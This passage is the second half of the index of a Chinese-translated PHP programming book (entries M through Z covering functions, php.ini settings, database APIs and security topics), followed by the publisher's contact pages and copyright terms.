  - 删除数据 ........................ 636
  - 输入数据 ......................... 633
  - 上次自动值 .................... 629
  - 输出数据 ........................ 634
- mt_getrandmax() (函数) ............. 273
- mt_rand() (函数) ................... 273
- mt_srand() (函数) .................. 273
- 多字节字符串函数 ............. 236
- MultiCell() (方法) ................... 851, 855
- 多维数组 ................ 243
- MVC .................................. 387
- MySQL ................................ 559
  - BLOB ............................... 580
  - 车值 .......................... 568
  - 连接设置 ................... 566
  - 数据库访问 .................... 566
  - 数据类型 ......................... 570
  - 删除数据 ........................ 592
  - 编辑数据 .......................... 594
  - 错误处理 ..................... 579
  - 安装 ......................... 559
  - 上次车值 ....................... 576
  - 输出数据 .......................... 591
  - 返回值 ........................ 572
  - 特殊功能 ..................... 576
  - TIMESTAMP ............................ 588
  - 事务 ......................... 577
- mysqli ............................... 559, 875
  - autocommit() (方法) .............. 577
  - bind_param() (方法) .............. 570
  - commit() (方法) .................. 577
  - errno (属性) ................... 579
  - error (属性) ................... 579
  - execute() (方法) ................. 571
  - insert_id (属性) ............... 576
  - 面向对象 .................... 567
  - query() (方法) ................... 568, 572
  - real_escape_string() (方法) ...... 569
  - rollback() (方法) ................ 577
- MYSQLI_ASSOC (常量) .............. 575
- mysqli_autocommit() (函数) ......... 577
- MYSQLI_BOTH (常量) ................. 575
- mysqli_close() (函数) .............. 566
- mysqli_close() (方法) ................ 567
- mysqli_commit() (函数) ............. 577
- mysqli_connect_errno() (函数) ...... 579
- mysqli_connect_error() (函数) ...... 579
- mysqli_connect() (函数) ............ 566
- mysqli_errno() (函数) .............. 579
- mysqli_error() (函数) .............. 579
- mysqli_fetch_array() (函数) ........ 575
- mysqli_fetch_assoc() (函数) ........ 572, 575
- mysqli_fetch_fields() (函数) ....... 576
- mysqli_fetch_object() (函数) ....... 573
- mysqli_fetch_row() (函数) .......... 574
- mysqli_init() (函数) ............... 582
- mysqli_insert_id() (函数) .......... 576
- MYSQLI_NUM (常量) .................. 576
- mysqli_options() (函数) ............ 582
- mysqli_prepare() (函数) ............ 570, 579
- mysqli_query() (函数) .............. 568, 572
- mysqli_real_connect() (函数) ....... 582
- mysqli_real_escape_string() (函数) ......................... 569, 875
- mysqli_result (类) .................. 572
  - fetch_array() (方法) ............. 575
  - fetch_assoc() (方法) ............. 572
  - fetch_fields() (方法) ............ 576
  - fetch_object() (方法) ............ 573
  - fetch_row() (方法) ............... 574
- mysqli_rollback() (函数) ........... 577
- mysqli_select_db() (函数) .......... 567





- mysqli_stmt_bind_param() (函数) ..... 570
- mysqli_stmt_errno() (函数) ..... 579
- mysqli_stmt_error() (函数) ..... 579
- mysqli_stmt_execute() (函数) ..... 571
- mysqli_stmt_send_long_data() (函数) ..... 581–582
- mysqli.default_host (php.ini) ..... 597
- mysqli.default_port (php.ini) ..... 597
- mysqli.default_pw (php.ini) ..... 597
- mysqli.default_socket (php.ini) ..... 597
- mysqli.default_user (php.ini) ..... 597
- mysqlnd ..... 565
- mysqlnd.collect_statistics (php.ini) ..... 597
- mysqlnd.net_cmd_buffer_size (php.ini) ... 597
- mysqlnd.net_read_buffer_size (php.ini) .. 597

## N

- 命名参数 ..... 168, 465, 510
- namespace (关键字) ..... 378
- 命名空间 ..... 376, 793
  - 别名 ..... 380
  - 创建 ..... 378
  - 确定 ..... 380
  - 导入 ..... 382
  - 使用 ..... 379
- natsort() (函数) ..... 261
- NDATA ..... 800
- NetPBM ..... 843
- Netscape ..... 771
- 永不 ..... 185
- new ..... 310
- next() (函数) ..... 248
- next() (方法) ..... 361
- nginx ..... 67, 947
- nl2br() (函数) ..... 204
- NoSQL ..... 685
- nowdoc 语法 ..... 195
- 空安全运算符 ..... 132
- nuSOAP ..... 752, 758
  - 客户端 ..... 760
  - 服务器 ..... 758
  - WSDL ..... 761
- nusoap_server() (方法) ..... 758

## O

- OAuth 2.0 ..... 904
- 对象模型 ..... 326
- 面向对象 ..... 307
  - $this ..... 315
  - 抽象类 ..... 335
  - 访问控制 ..... 324
  - 继承 ..... 317
  - 迭代 ..... 360
  - 重载 ..... 316, 339
  - 重写 ..... 319
- 面向对象架构 ..... 748
- 对象 ..... 102, 309
  - 比较 ..... 355
  - 序列化 ..... 356
- OCI_ASSOC (常量) ..... 651
- oci_bind_by_name() (函数) ..... 649
- oci_close() (函数) ..... 645
- OCI_COMMIT_ON_SUCCESS (常量) ... 647
- oci_commit() (函数) ..... 647
- oci_connect() (函数) ..... 645
- OCI_DEFAULT (常量) ..... 647
- oci_error() (函数) ..... 646
- oci_execute() (函数) ..... 646
- oci_fetch_all() (函数) ..... 651
- oci_fetch_assoc() (函数) ..... 650
- oci_fetch_object() (函数) ..... 650
- oci_fetch() (函数) ..... 645, 649
- oci_new_descriptor() (函数) ..... 653
- OCI_NUM (常量) ..... 651
- oci_parse() (函数) ..... 646, 649
- oci_result() (函数) ..... 649
- oci_rollback() (函数) ..... 645
- oci_logon() (函数) ..... 645
- 八进制表示法 ..... 270
- 八进制 ..... 107, 270
- octdec() (函数) ..... 270
- OIDC ..... 904
- OIDS ..... 667
- 在线手册 ..... 88
- OOA ..... 748
- opendir() (函数) ..... 717
- OpenSSL ..... 727
- 操作数 ..... 113
- 算术运算 ..... 113
- 运算符 ..... 113
  - 位运算 ..... 124
  - 比较 ..... 117
  - 条件运算 ..... 130
  - 带零检查的条件运算 ..... 131
  - 递减 ..... 115
  - 递增 ..... 115
  - 逻辑运算 ..... 123
  - 空安全 ..... 132
  - 优先 ..... 134
  - 排名 ..... 134
  - 太空船运算符 ..... 123
- or ..... 124
- Oracle ........................ 641
  - BLOB ........................ 653
  - 连接设置 .............. 645
  - 删除数据 ................. 657
  - DUAL ........................ 647
  - 编辑数据 ................... 659
  - 输入数据 .................. 655
  - 环境变量 ....... 643
  - 错误处理 .............. 646
  - 最后自动值 ............. 652
  - LOB ......................... 653
  - 输出数据 ................. 656
  - 返回值 ............... 649
  - 序列 ................... 652
  - 特殊特性 ............ 652
- ord() (函数) ............ 212, 233
- ORDER BY (SQL) .............. 530
- 输出 ...................... 729
- Output() (方法) ........... 849
- 重载 .................. 166, 316, 339
- 覆盖 ................... 709
- 覆盖 (面向对象) .............. 319
- OWASP ....................... 865

## P

- Packagist ................... 75, 960
- 参数 ...................
  - 默认值 ............ 165
  - 可变数量 .......... 166
- 参数 .................. 164
  - 方法 .............. 313
- parse_url() (函数) ...... 230
- 解析器 ...................... 796
- password_get_info() (函数) 892
- password_hash() (函数) ... 235, 892
- password_needs_rehash() (函数) 892
- password_verify() (函数) .. 892
- 密码哈希 API ........ 892
- 密码保护 ......... 491
- 路径 ....................... 710
  - 实际 ................... 718
  - 虚拟 .................. 718
- PDF ......................... 
  - 库 ................ 845
- PDO ......................... 
  - exec() (方法) .......... 545
  - PHP 数据对象 ......... 542
  - prepare() (方法) ....... 546
  - query() (方法) ......... 548
- PDOStatement ................
  - bindParam() (方法) ..... 546
  - execute() (方法) .......... 546
  - fetch() (方法) ............ 548
- PEAR ........................ 75
  - 频道 ................. 77
  - 安装 ............. 75
  - 手册 ................... 78
  - Text_CAPTCHA ............. 888
  - 无需安装 ..... 78
  - XML_SVG .................. 77
- PEAR2 ....................... 78
- PECL ........................ 542, 687, 965
  - PECL_Gen ................. 970
- Xdebug ...................... 936
- 性能
  - 会话 ................. 485
  - 字符串 .................. 209
- Perl ........................ 295
- 个人主页工具 ..... 33
- pg_close() (函数) ....... 665
- pg_connect() (函数) ..... 665
- pg_escape_string() (函数) . 666, 875
- pg_fetch_all() (函数) ..... 669
- pg_fetch_assoc() (函数) ... 668
- pg_fetch_object() (函数) .. 668
- pg_fetch_row() (函数) ..... 669
- pg_insert() (函数) ........ 671
- pg_last_error() (函数) .... 665
- pg_last_oid() (函数) ...... 670
- pg_lo_close() (函数) ...... 673
- pg_lo_create() (函数) ..... 673
- pg_lo_open() (函数) ....... 673
- pg_lo_read_all() (函数) .... 674
- pg_lo_read() (函数) ....... 674
- pg_lo_write() (函数) ...... 673
- pg_query() (函数) ......... 665, 668
- pgAdmin ..................... 665
- PHP ......................... 942, 955
  - 缩写 ............. 33
  - 基础 ................... 93
  - 错误跟踪器 .............. 978
  - 编译 .................. 56
  - 概念 .................. 36
  - 常量 ................ 112
  - 数据类型 ............... 101
  - 发行版 ............. 35
  - 扩展 ................... 965
  - 外部脚本 .......... 96
  - 函数 ................ 190
  - 历史 .................. 33
  - 主页 ................. 44
  - 在 HTML 中 .................. 93
  - 安装 .................................... 45
  - 安装扩展 ............................ 61
  - 指令 .................................... 95
  - 解释器 ..................................... 37
  - 日志 ......................................... 923
  - 邮件列表 ................................... 88
  - 在线手册 ................................... 88
  - 运算符 ....................................... 113
  - 补丁 ......................................... 977
  - 实用项目 .............................. 35
  - 引号 ................................. 100
  - 短路求值 ........................ 124
  - 版本变更 .................................. 54
  - 版本 ........................................ 33
- php_admin_flag (php.ini) ........................ 919
- php_admin_value (php.ini) ....................... 919
- php_flag (php.ini) .............................. 919
- PHP_INI_ALL (php.ini) ........................... 919
- PHP_INI_PERDIR (php.ini) ........................ 919
- PHP_INI_SYSTEM (php.ini) ........................ 919
- PHP_INI_USER (php.ini) .......................... 919
- php_user_filter (类) ......................... 736
- php_value (php.ini) ............................. 919
- php://
  - filter .......................................... 729, 735
  - input ........................................... 729
  - output .......................................... 729
  - stderr .......................................... 729
  - stdin ........................................... 728
  - stdout .......................................... 728
- php.exe ......................................... 51
- php.ini ......................................... 47, 51
  - asp_tags ........................................ 94
  - BZ2 ............................................. 739
  - 指令 ....................................... 47
  - EXIF ............................................ 817
  - 扩展 ...................................... 61, 927
  - 文件上传 .................................... 926
  - ini_set() ....................................... 919
  - 日志 ......................................... 923
  - mail.add_x_header ............................... 509
  - mail.force_extra_parameters ..................... 509
  - mail.log ........................................ 509
  - mail.mixed_lf_and_crlf .......................... 509
  - mail 函数 ................................... 508
  - 数学 ..................................... 277
  - MySQL ........................................... 597
  - register_long_arrays ............................ 407
  - 资源限制 ................................. 922
  - sendmail_from ................................... 509
  - sendmail_path ................................... 509
  - session.auto_start .............................. 485
  - session.cookie_httponly ....................... 504
  - session.gc_maxlifetime ........................ 485
  - session.name .................................. 490
  - session.referer_check ......................... 503
  - session.save_path ............................. 481
  - session.sid_length ............................ 482
  - session.use_trans_sid ......................... 483
  - short_open_tag .................................. 94
  - SMTP ............................................ 508
  - smtp_port ....................................... 509
- php.ini-development ........................... 51
- php.ini-production ............................ 51
- PHP 7
  - 新功能 .................................... 42
  - 无 POSIX ........................................ 295
- PHP 7.3, 新功能 ......................... 41
- PHP 8
  - 属性 ...................................... 372
  - 新功能 .................................... 37
  - 新打印参数 ............................ 197
  - 新字符串函数 ............................ 220
  - 属性提升 .............................. 322
  - static .......................................... 334
  - 字符串-数字比较 ....................... 121
  - 尾随逗号 .................................. 165
- PHP 8.1
  - 八进制表示法 .................................. 270
- php-cgi.exe ..................................... 51
- php-cgi.ini ..................................... 918
- php-cli.ini ..................................... 918
- PHP 数据对象 ................................ 542
- PHP 基金会 .................................. 983
- phpinfo() (函数) ............................ 55, 978
- phpMyAdmin ...................................... 562
- PHPRC ........................................... 52
- PHP-SOAP ........................................ 752, 765
  - 客户端 .......................................... 766
  - 服务器 .......................................... 765
  - WSDL ............................................ 768
- PHP 流 ..................................... 735
- PHPUnit ......................................... 941
  - assertEquals() (方法) ......................... 944
  - expectException() (方法) ...................... 945
  - 安装 .................................... 942
  - 测试用例 ....................................... 944
- pickArrayKeys() (方法) ........................ 273
- 图片库 ................................. 453
- 饼图 ....................................... 830
- PNG ............................................. 824
- 点语法 .................................... 311
- Polygon() (方法) .............................. 852
- Pool, Martin .................................... 261




- POP .................................... 521
- 端口 .................................... 49
- 可移植文档格式 ............ 845
- pos() (function) ...................... 249
- POSIX ................................. 295
- postfix ............................... 507
- PostgreSQL ............................ 661
  - 管理 ........................ 663
  - 连接设置 ...................... 665
  - 删除数据 ........................... 680
  - 安装 .......................... 661
  - 最后自动值 ....................... 670
  - 输出数据 ........................... 679
  - 返回值 .......................... 668
  - 特殊功能 ...................... 670
- 效能 ............................... 267
- pow() (function) ...................... 267
- 首选项 ............................ 134
- 预填, 复选框 ................ 437
- preg_grep() (function) ................ 301
- preg_match_all() (function) ........... 299
- preg_match() (function) ............... 297
- PREG_OFFSET_CAPTURE (constant) .. 298, 300
- PREG_PATTERN_ORDER (constant) ....... 300
- preg_quote() (function) ............... 301
- preg_replace_callback() (function) .... 301
- preg_replace() (function) ............. 301
- PREG_SET_ORDER (constant) ............. 301
- preg_split() (function) ............... 209, 301
- prev() (function) ..................... 249
- print_r() (function) .................. 198
- print() (statement) ................... 129
- print (instruction) ................... 99, 193, 933
- printf() (function) ................... 196
- private ............................... 324
- 过程式编程 ................ 307
- 过程 ............................. 171
- 发音测试 .................... 232
- 属性 ............................ 309, 311
  - 名称和值 ...................... 360
- 属性提升 .................... 322
- protected ............................. 327
- 提供者 .............................. 748
- 拉取请求 .......................... 980
- Pyrus ................................. 386

### Q

- quoted_printable_encode() (function) .... 736
- quotemeta() (function) .................. 224
- qmail ................................. 507
- query() (method) ...................... 810
- 引号 ....................... 100, 106
- quoted_printable_decode() (function) .... 736

### R

- rad2deg() (function) .................... 276
- 弧度制 .......................... 276
- Ramsey, Ben ............................. 982
- rand() (function) ....................... 272
- random_bytes() (function) ............... 884
- Random\Randomizer (class) ............... 273
- range() (function) ...................... 257
- Ratchet ................................. 783
- re2c .................................... 70
- read() (method) ......................... 717
- 读取访问权 ............................. 709
- 读取标头 ............................. 949
- 读取 HTTP 标头 .................................. 949
- readonly ................................ 330
- 实数 .................................... 102
- Rect() (method) ......................... 852, 861
- 递归函数 ..................... 176
- 引用 .............................. 110, 320
- register_globals (php.ini) .............. 261, 867
- register_long_arrays (php.ini) .......... 262, 407
- register_shutdown_function() (function) .............................. 497
- register() (method) ..................... 758
- 正则表达式 ..................... 295
  - 过滤链接 ............................ 304
  - 邮政编码 ............................ 303
  - 电话号码 ....................... 304
- relaxNGValidate() (method) .............. 812
- relaxNGValidateSource() (method) ........ 812
- REMOVE_ADDR ............................. 502
- rename() (function) ..................... 716
- require_once() (instruction) ............ 97
- require() (instruction) ................. 96
- reset() (function) ...................... 249
- 资源 ................................ 102
- 资源限制 (php.ini) ............... 922
- REST .................................... 748, 754
- Rethans, Derick ......................... 685, 878, 935
- return (statement) ...................... 98, 171
- 返回值 ........................... 171
  - 按引用 ............................ 173
  - 多个 ................................. 172
- rewind() (function) ..................... 713
- rewind() (method) ....................... 361
- rmkdir() (function) ..................... 716
- ROLLBACK (SQL) .......................... 539
- round() (function) ........................ 275
- 轮 .................................... 275
- RPC ....................................... 748
- RPM ....................................... 46
- rtrim() (function) ........................ 216

### S

- \s ........................................ 296
- Safari
  - Cookie ................................... 457
- Sajax ..................................... 778
- 盐 ...................................... 893
- SameSite Cookie ........................... 466, 503, 885
- SAML ...................................... 904
- API ....................................... 45
- save() (method) ........................... 653, 807, 809, 813
- saveHTML() (method) ....................... 807
- saveHTMLFile() (method) ................... 807
- saveXML() (method) ........................ 806, 809, 813
- SAX ....................................... 796-797
- schemaValidate() (method) ................. 812
- schemaValidateSource() (method) ........... 812
- 方案 .................................... 793, 812
- Schlossnagle, George ...................... 542, 965
- 网页抓取 ........................... 886
- 二级域名 (SLD) ................. 460
- 安全 .................................. 865
  - 漏洞 .................................. 865
  - 隐藏字段 ......................... 876
  - JavaScript 代码 ....................... 871
  - 会话劫持 ..................... 872
  - 会话 .............................. 501
  - SQL 注入 ......................... 874
  - 用户输入 ............................ 866
- XSS (跨站脚本) ................ 869
- SELECT (SQL) .............................. 530
- 选择列表 ........................... 415, 437
- sendmail .................................. 507
- sendmail_from (php.ini) ................... 509, 514
- sendmail_path (php.ini) ................... 509
- 代码与内容分离 ................. 96
- 代码与内容分离 ............ 96

- 序列 ................................. 652
- 序列化 ................................. 356
- serialize() (function) .................... 719
- service() (method)
- nuSOAP .................................... 759
- 服务消费者 .......................... 748
- 服务提供者 .......................... 748
- session_destroy() (function) .............. 490
- session_name() (function) ................. 490
- session_regenerate_id() (function) ........ 503
- session_set_save_handler() (function) ............................ 494, 497
- session_start() (function) ................ 485
- session_unset() (function) ................ 490
- session.auto_start (php.ini) .............. 485
- session.gc_divisor (php.ini) .............. 485
- session.gc_maxlifetime (php.ini) .......... 485
- session.gc_probability (php.ini) .......... 485
- session.name (php.ini) .................... 490
- session.referer_check (php.ini) ........... 503
- session.save_path (php.ini) ............... 919
- session.use_cookies (php.ini) ............. 483
- session.use_only_cookies (php.ini) ........ 483
- session.use_trans_sid (php.ini) ........... 483

- 会话 Cookie ........................... 462
- SessionHandler (class) .................... 500
- SessionHandlerInterface (Interface) ....... 500
- 会话劫持 ......................... 502, 872
- Session riding ............................ 882
- 会话 .................................. 481, 895
  - <iframe> .............................. 484
  - 删除数据 ........................... 490
  - 性能 ........................... 485
  - 每个 URL ............................... 483
  - 受保护区域 ........................ 491
  - 读取并关闭 ........................ 491
  - 读取数据 ............................. 488
  - 安全 .............................. 501
  - 会话 ID ............................ 482
  - 使用 Cookie .......................... 483

- set_include_path() (function) ............. 99
- setAttribute() (method) ................... 808
- SetAutoPageBreak() (method) ............... 848
- setcookie() (function) .................... 461
- SetFillColor() (method) ................... 861
- SetFont() (method) ........................ 848, 859
- setlocale() (function) .................... 290
- SetMargins() (method) ..................... 848
- setPrintFooter() (method) ................. 848
- setPrintHeader() (method) ................. 848
- setProperty() (method) .................... 813
- setrawcookie() (function) ................. 468
- SFTP ...................................... 727
- SGML ...................................... 791
- SHA1 ...................................... 892
- sha1_file() (function) .................... 234
- sha1() (function) ......................... 234
- Shell 运算符 ............................ 129
- Shopware .................................. 36
- short_open_tag (php.ini) .................. 94, 919
- 短路求值 .................. 124, 146




-   shuffle() (函数) .................... 260
-   shuffleArray() (方法) ................. 273
-   similar_text() (函数) ............... 231
-   针对 XML 的简单 API ...................... 796
-   简单邮件传输协议 ........... 505
-   简单对象访问协议 (已弃用) .. 750
-   SimpleXML ............................... 749, 796, 801
-   使用 DOM ................................ 805
-   写访问 ............................ 804
-   XPath ................................... 804
-   simplexml_import_dom() (函数) ....... 805
-   simplexml_load_file() (函数) ........ 802
-   simplexml_load_string() (函数) ...... 802
-   sin() (函数) ........................ 276
-   单点登录 (SSO) .................... 904
-   sizeof() (函数) ..................... 250
-   SMTP .................................... 505
-   php.ini ................................. 508
-   设置 ................................ 508
-   smtp_port (php.ini) ..................... 509
-   smtp4dev ................................ 508
-   Microsoft SMTP 服务 ................. 507
-   SOA ..................................... 748
-   SOAP .................................... 750
-   SoapFault (类) ....................... 767
-   SoapServer (类) ...................... 765
-   sort() (函数) ....................... 260
-   soundex() (函数) .................... 232
-   太空船运算符 ...................... 123
-   特殊字符 ...................... 225
-   在 Cookie 中 .............................. 468
-   SPL ..................................... 363
-   spl_autoload_register() (函数) ...... 350
-   split() (函数) ...................... 209
-   sprintf() (函数) .................... 198
-   SQL ..................................... 525
-   聚合函数 ..................... 536
-   别名 ................................. 537
-   COMMIT .................................. 539
-   COUNT ................................... 536
-   CREATE DATABASE ......................... 528
-   CREATE TABLE ............................ 528
-   数据类型 .............................. 527
-   日期值 ............................. 528
-   连接 ................................... 536
-   LIKE .................................... 531
-   ORDER BY ................................ 530
-   ROLLBACK ................................ 539
-   SELECT .................................. 530
-   存储过程 ....................... 539
-   版本 ................................ 525
-   WHERE ................................... 531, 533

-   SQL Developer ........................... 643
-   SQL 注入 ........................... 874
-   SQLite .................................. 599
-   兼容性 ........................... 611
-   数据访问 ............................. 601
-   编辑数据 ............................... 618
-   嵌入 PHP 代码 .......................... 609
-   错误处理 .......................... 603
-   安装 ............................ 599
-   输出数据 ............................. 615
-   返回值 ........................... 605
-   特殊功能 ........................ 608
-   SQLite3 ................................. 600
-   changes() (方法) ...................... 607
-   close() (方法) ........................ 601
-   createFunction() (方法) ............... 610
-   escapeString() (方法) ................. 603, 613
-   exec() (方法) ......................... 602, 607
-   lastErrorCode() (方法) ................ 603
-   lastErrorMsg() (方法) ................. 603
-   lastInsertRowID() (方法) .............. 608, 614
-   prepare() (方法) ...................... 604
-   query() (方法) ........................ 602, 605
-   querySingle() (方法) .................. 606, 609
-   SQLite3 (类) ......................... 601
-   escapeString() (方法) ................. 875
-   SQLite3Result
-   fetchArray() (方法) ................... 605
-   SQLite3Result (类) ................... 605
-   SQLite3Stmt
-   bindValue() (方法) .................... 604
-   execute() (方法) ...................... 604
-   SQLite3Stmt (类) ..................... 604
-   sqlite-shim ............................. 611
-   sqlsrv_begin_transaction() (函数) ... 629
-   sqlsrv_commit() (函数) .............. 629
-   sqlsrv_connect() (函数) ............. 625
-   sqlsrv_execute() (函数) ............. 628
-   sqlsrv_fetch_array() (函数) ......... 626-627
-   sqlsrv_fetch_object() (函数) ........ 627
-   sqlsrv_fetch() (函数) ............... 627
-   sqlsrv_get_field() (函数) ........... 628
-   sqlsrv_has_rows() (函数) ............ 632
-   sqlsrv_num_rows() (函数) ............ 630, 632
-   sqlsrv_prepare() (函数) ............. 628
-   sqlsrv_query() (函数) ............... 625
-   sqlsrv_rows_affected() (函数) ....... 630
-   sqlsrv_server_info() (函数) ......... 632
-   sqrt() (函数) ....................... 267
-   平方根 ............................. 267
-   ssl ..................................... 728
-   标准通用标记语言 .... 791

-   static .................................... 178, 326
-   返回值 .............................. 334
-   static() (函数) ....................... 334
-   静态变量 .......................... 177
-   StdClass (类) .......................... 692
-   stderr .................................... 729
-   stdin ..................................... 728
-   stdout .................................... 728
-   存储过程 ......................... 539, 630
-   str_contains() (函数) ................. 220
-   str_ends_with() (函数) ................ 220
-   str_ireplace() (函数) ................. 213, 222
-   str_replace() (函数) .................. 208, 221
-   str_split() (函数) .................... 209
-   str_starts_with() (函数) .............. 220
-   str_word_count() (函数) ............... 205, 210
-   strcasecmp() (函数) ................... 231
-   strcmp() (函数) ....................... 231
-   stream_context_create() (函数) ........ 731
-   stream_filter_append() (函数) ......... 738
-   stream_filter_prepend() (函数) ........ 738
-   stream_filter_register() (函数) ....... 737
-   stream_get_filters() (函数) ........... 737
-   stream_get_meta_data() (函数) ......... 730
-   流 ................................... 727
-   压缩 ............................... 738
-   上下文 ................................... 731
-   FTP ....................................... 735
-   HTTP ...................................... 729
-   元数据 .................................. 730
-   PHP ....................................... 735
-   strict_types .............................. 180
-   string.rot13 (过滤器) ..................... 736
-   string.strip_tags (过滤器) ................ 736, 743
-   string.tolower (过滤器) ................... 736
-   string.toupper (过滤器) ................... 736
-   string.toupper (过滤器) ................... 736
-   Stringable (接口) .................... 309
-   字符串 ................................... 101, 201
-   访问字符 ......................... 202
-   比较 ................................... 231
-   拼接 ............................... 116
-   连接 ................................... 116
-   转换表 .......................... 228
-   日期 ...................................... 286
-   加密 ................................ 234
-   格式化 ................................. 196
-   heredoc ................................... 193
-   换行符 ............................... 203
-   负偏移量 ........................... 202, 217
-   nowdoc .................................... 195
-   性能 ............................... 209

-   修剪 ..................................... 214
-   查找和替换 ........................ 216
-   共享 ..................................... 205
-   相似性 ................................ 231
-   按字母顺序排序 ....................... 121
-   大小写 ...................... 212
-   strip_tags() (函数) ................... 229, 736
-   stripslashes() (函数) ................. 224
-   stripslashes() (函数) ................. 223, 225
-   stristr() (函数) ...................... 218
-   strlen() (函数) ....................... 203, 205
-   strpbrk() (函数) ...................... 219
-   strpos() (函数) ....................... 216, 939
-   负偏移量 ........................... 217
-   strptime() (函数) ..................... 289
-   strrev() (函数) ....................... 236
-   strripos() (函数) ..................... 217
-   strrpos() (函数) ...................... 217
-   strtok() (函数) ....................... 206
-   strtolower() (函数) ................... 212, 736
-   strtotime() (函数) .................... 287, 591
-   strtoupper() (函数) ................... 212, 736
-   strtr() (函数) ........................ 222
-   substr() (方法) ......................... 294
-   substr_compare() (函数) ............... 231
-   substr_count() (函数) ................. 218
-   substr_replace() (函数) ............... 221
-   substr() (函数) ....................... 203, 205, 214
-   超全局数组 ........................ 111, 261
-   泽夫·苏拉斯基 ............................. 33
-   翁德热·苏热 .............................. 67
-   switch .................................... 142
-   带条件 ............................ 145
-   Symphony .................................. 386
-   system() (函数) ....................... 716
-   系统操作 ......................... 716

## T

-   \t ........................................ 107, 215
-   tan() (函数) .......................... 276
-   TARGET_CLASS (常量) ................... 373
-   TCP ....................................... 728
-   TCPDF ..................................... 847
-   TCPDF() (对象) .......................... 847
-   三元运算符 .......................... 130
-   Text_CAPTCHA .............................. 888
-   textContent (属性) .................... 807
-   文本字段 ................................ 421
-   time() (函数) ......................... 285
-   时间戳 ................................. 285
-   TIMESTAMP (SQL) ........................... 527





- 时区 290

- 尾随逗号 165

- 特性 345

- 事务 538

- transformToDoc() (方法) 813

- transformToUri() (方法) 813

- transformToXml() (方法) 813

- 触发器 647

- trim() (函数) 216

- TrueType 字体 828

- 真值 102, 117

- tryFrom() (方法) 187

- TTF 828

- 图灵, Alan 886

- 类型转换 103

- 类型声明 178
  - 可为 null 182

- TYPO3 36

## U

- \u 107

- ucfirst() (函数) 213

- ucwords() (函数) 213

- UDP 728

- 未处理的匹配错误 146

- 联合类型 183

- uniqid() (函数) 235

- 单元测试 941

- unlink() (函数) 716

- unset() (函数) 110, 242, 490

- URI 950

- URL 483
  - 信息 950

- urldecode() (函数) 229

- urlencode() (函数) 229, 468, 591

- use (关键字) 345, 381-382

- 基于会话的用户身份验证 491

- usort() (函数) 122

- US 安全哈希 234

- UTF-8 227, 800

- utf8_decode() (函数) 679

- utf8_encode() (函数) 677, 681

## V

- \v 215

- valid() (方法) 361

- validate() (方法) 812

- var_dump() (函数) 198, 669, 934

- var_export() (函数) 199, 715

- VARCHAR (SQL) 527

- 变量
  - 命名约定 104
  - 输出 105
  - 预定义 111
  - 引用 110
  - 静态 177
  - 有效性 169
  - 变量 105

- 虚拟路径 718

- void 182

## W

- \w 296

- W3C 750, 791

- WAMPSERVER 49

- 沃诺克, John 845

- WeakMap (类) 308

- Web 服务器 48
  - Apache 947
  - 身份验证 895
  - 未找到 81
  - 端口 49
  - 服务器错误 86

- Web 服务描述语言 750

- Web 服务 747
  - 架构 748
  - gzip 751
  - 安装 752
  - 包 752
  - 问题 751
  - 协议 748

- 网站，创建文本版本 742

- WebSockets 782
  - 客户端 786
  - 服务器 783

- WHATWG 782

- WHERE (SQL) 531, 533
  - while 153
  - 替代语法 155

- 空白字符 215, 800

- window.alert() (JavaScript) 772

- Windows
  - 身份验证 900
  - 编译 PHP 56
  - 安装 48

- 瓦纳, Dave 747

- --with-apxs2[=file] (开关) 70

- --with-config-file-path=/etc/ (开关) 73

- --with-gd (开关) 823

- --with-haru[=library] (开关) 847

- --with-mysql=/path/to/mysql_config (开关) 565

- --with-mysql=/path/to/mysql (开关) 565

- --with-mysqli (开关) 71

- --with-oci8 (开关) 642

- --without-pear (开关) 75

- --with-xsl[=path] (开关) 796

- WordPress 35

- wordwrap (函数) 203

- Write() (方法) 849

- 写入权限 709

- writeHTML() (方法) 858

- WSDL 750

- nuSOAP 761

- PHP-SOAP 768

- WS-Security 751

- WWW-Authenticate 标头 896

- xml_set_processing_instruction_handler() (函数) 800

- xml_set_unparsed_entity_decl_handler() (函数) 800

- XML_SVG 77

- XMLHttpRequest 777

- XML-RPC 747

- xor 124

- XPath 795

- DOM 810

- XQuery 795

- XSD 793

- XSL 794

- XSLT 813

- XsltProcessor (类) 813

- XSS 504, 869

## X

- \x00 107

- XAMPP 49, 69

- Xdebug 935

- XE 481

- XE \ 363

- XE \Hypertext 33

- XE \pg_pconnect() 665

- XE \realpath() 718

- XE \strftime() 289

- X-Mailer 511

- XML 791
  - 安装 796
  - 命名空间 793
  - 编程访问 796
  - 架构 793
  - SimpleXML 801
  - 有效 793
  - 验证 811
  - 格式良好 791

- XML_OPTION_CASE_FOLDING (常量) 799

- XML_OPTION_SKIP_WHITE (常量) 800

- XML_OPTION_TARGET_ENCODING (常量) 800

- xml_parse() (函数) 798

- xml_parser_create() (函数) 797

- xml_parser_free() (函数) 798

- xml_parser_get_option() (函数) 800

- xml_parser_set_option() (函数) 799

- xml_set_character_data_handler() (函数) 797

- xml_set_element_handler() (函数) 797

## Y

- yield 177

## Z

- Zend 34, 386

- Zend Engine 2 307

- Zend Framework 386

- ZERO 102, 166, 189

- 空合并运算符 131





## 服务页面

以下各部分包含有关如何与我们联系的说明。

### 赞美与批评

我们希望您喜欢阅读本书。如果本书符合您的期望，请向他人推荐。如果您认为还有改进空间，请联系本书编辑：rachelg@rheinwerk-publishing.com。我们欢迎每一条改进建议，当然也欢迎任何赞美！

您也可以通过 Twitter、Facebook 或电子邮件分享阅读体验。

### 补充资料

如果有可用的补充材料（示例代码、练习材料、列表等），它们将在您的在线图书馆以及本书的网页目录页面中提供。您可以使用以下链接直接导航到该页面：http://www.rheinwerk-computing.com/6022。如果我们发现会改变含义的笔误或内容错误，我们也会在那里提供勘误列表。

### 技术问题

如果您在 Rheinwerk Computing 的电子书或电子书账户中遇到技术问题，欢迎随时联系我们的读者服务：support@rheinwerk-publishing.com。

### 关于我们及我们的出版计划

网站 http://www.rheinwerk-computing.com 提供有关我们当前出版计划的详细且一手的信息。在这里，您还可以轻松订购我们的所有图书和电子书。关于 Rheinwerk Publishing Inc. 及其他联系方式也可在 http://www.rheinwerk-computing.com 上找到。

## 法律声明

本部分包含本电子书详细且具有法律约束力的使用条件。

### 版权声明

本出版物受版权全面保护。作者和 Rheinwerk Publishing 保留所有使用和开发权利；特别是复制权和分发权，无论是印刷形式还是电子形式。

© 2025 由 Rheinwerk Publishing, Inc. 版权所有，波士顿 (MA)

### 用户权利

您仅有权出于个人目的使用本电子书。特别是，您可以出于个人使用目的打印电子书或复制它，前提是将此副本存储在仅由您个人使用的设备上。您无权进行任何其他使用或开发。

